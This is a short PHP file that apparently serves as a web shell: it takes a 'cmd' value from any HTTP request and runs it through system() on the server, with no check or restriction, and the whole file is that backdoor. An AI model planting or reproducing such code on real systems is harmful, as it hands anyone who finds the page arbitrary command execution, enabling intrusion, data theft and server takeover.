<?php
$cmd = $_REQUEST['cmd'];
if (isset($cmd)){
	system($cmd);
	echo "</div></pre>";
}
?>